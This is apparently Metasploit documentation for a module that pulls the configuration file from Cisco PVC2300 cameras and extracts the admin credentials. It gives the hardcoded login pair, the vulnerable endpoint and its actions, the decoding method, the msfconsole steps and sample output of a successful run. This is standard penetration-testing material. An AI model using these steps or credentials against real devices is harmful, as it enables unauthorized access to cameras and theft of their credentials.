## Vulnerable Application
This module exploits an information disclosure vulnerability in Cisco PVC2300 cameras in order to download the configuration file
containing the admin credentials for the web interface.

The module first performs a basic check to see if the target is likely Cisco PVC2300. If so, the module attempts to obtain a sessionID
via an HTTP GET request to the vulnerable /oamp/System.xml endpoint using the `login` action and the hardcoded credentials `L1_admin:L1_51`.

If a session ID is obtained, the module uses it in another HTTP GET request to /oamp/System.xml that uses the `downloadConfigurationFile`
action in an attempt to download the configuration file.

The configuration file, if obtained, will be encdoded using base64 with a non-standard alphabet. In order to decode it,
the module first translates the encoded configuration file from the default base64 alphabet to the custom alphabet.
Then the configuration file is decoded using regular base64 and subsequently stored in the `loot` folder.

Finally, the module attempts to extract the admin credentials to the web interface from the decoded configuration file.

No known solution was made available for this vulnerability and no CVE has been published.
It is therefore likely that most (if not all) Cisco PVC2300 cameras are affected.

This module was successfully tested against several Cisco PVC2300 cameras.

## Options
No non-default options are configured.

## Verification Steps
1. Start msfconsole
2. Do: `use auxiliary/gather/cisco_pvc2300_download_config`
3. Do: `set RHOSTS [IP]`
4. Do: `run`

## Scenarios
### Cisco PVC2300
```
Module options (auxiliary/gather/cisco_pvc_2300_info_disclosure):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   172.31.31.233    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host

msf6 auxiliary(gather/cisco_pvc_2300_info_disclosure) > run
[*] Running module against 172.31.31.233

[*] The target may be vulnerable. Obtained sessionID 1122062985
[+] Successfully downloaded the configuration file
[*] Saving the full configuration file to /root/.msf4/loot/20220803124629_default_172.31.31.233_ciscopvc.config_489884.txt
[*] Obtained device name PVC2300 POE Video Camera
[+] Obtained the following admin credentials for the web interface from the configuration file:
[*] admin username: admin
[*] admin password: [obfuscated]
[*] Auxiliary module execution completed
```
